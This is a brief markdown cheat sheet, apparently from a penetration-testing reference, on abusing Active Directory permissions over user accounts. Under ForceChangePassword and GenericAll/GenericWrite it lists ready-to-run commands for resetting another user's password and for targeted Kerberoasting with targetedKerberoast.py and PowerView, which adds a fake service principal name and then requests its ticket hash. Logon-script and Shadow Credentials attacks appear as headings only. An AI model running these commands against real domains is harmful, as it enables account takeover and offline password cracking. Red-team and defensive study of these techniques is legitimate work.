# ACLs/ACEs permissions on User

### ForceChangePassword

 - net user USER PASSWORD /domain

 - net rpc password USER PASSWORD -S DC_FQDN

### GenericAll / GenericWrite

#### 1) Change Password

 - net user USER PASSWORD /domain

#### 2) Targeted Kerberoasting (add SPN)

 - targetedKerberoast.py -d DOMAIN -u USER -p PASS (TGS Hash)

 - Set-DomainObject -Identity TARGET_USER -SET @(serviceprincipalname='nonexistent/WHATEVER') (Powerview)

 - Get-DomainSPNTicket -SPN nonexistent/WHATEVER (Powerview)

#### 3) Logon Script (Access)

#### 4) add Key Credentials (Shadow Credentials)
